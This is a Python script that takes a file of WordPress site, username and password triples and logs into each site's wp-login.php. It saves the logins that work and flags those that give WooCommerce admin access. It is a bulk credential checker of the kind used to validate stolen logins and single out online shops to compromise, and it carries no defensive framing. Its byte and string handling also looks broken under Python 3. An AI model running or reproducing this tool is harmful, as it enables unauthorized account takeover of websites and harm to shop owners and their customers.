import requests
import re

from multiprocessing.dummy import Pool as ThreadPool
from colorama import Fore, init

# Initialize colorama for terminal text coloring
init(autoreset=True)

# Define color codes for output
fr = Fore.RED
fc = Fore.CYAN
fw = Fore.WHITE
fg = Fore.GREEN
fm = Fore.MAGENTA
fy = Fore.YELLOW

def check_woocommerce(url):
    try:
        session = requests.session()
        site, user, passwd = url.split("|")
        
        # Attempt to get the login page
        get = session.get(site, timeout=10)
        
        # Extract submit and redirect information from the login page
        submit = re.findall(
            '<input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="(.*)" />',
            get.content)[0]
        redirect = re.findall('<input type="hidden" name="redirect_to" value="(.*?)" />', get.content)[0]
        
        # Prepare login data
        login_data = {
            'log': user,
            'pwd': passwd,
            'wp-submit': submit,
            'redirect_to': redirect,
            'testcookie': '1'
        }
        
        # Attempt to login
        req = session.post(site, data=login_data, timeout=20)
        curr_url = site.replace("/wp-login.php", "")
        
        if 'dashboard' in req.content:
            print('Login Success! Checking WooCommerce plugins...' + site)
            
            # Write successful logins to a file
            with open('loginsuccess.txt', 'a') as writer:
                writer.write(f"http://{site}/wp-login.php|{user}|{passwd}\n")
            
            # Check if WooCommerce is installed
            check_url = curr_url + "/wp-admin/admin.php?page=wc-admin"
            get_data = session.get(check_url, timeout=20, allow_redirects=False).content
            
            if 'WooCommerce' in get_data:
                print(fg + "[+] " + curr_url + " >> WooCommerce installed" + fw)
                # Write successful WooCommerce installations to a file
                with open('WooCommerce.txt', 'a') as writer:
                    writer.write(f"{curr_url}/wp-login.php|{user}|{passwd}\n")
            else:
                print(fy + "[-] " + curr_url + " >> WooCommerce not found" + fw)
        else:
            print(fy + "[-] " + curr_url + " ==> Login failed" + fw)
    except Exception as e:
        print(f"Error occurred: {e}")

# Read input file containing login information
lists = input('Enter Your Logins: ')
with open(lists) as f:
    for url in f:
        check_woocommerce(url.strip())  # Strip to remove any trailing newline characters
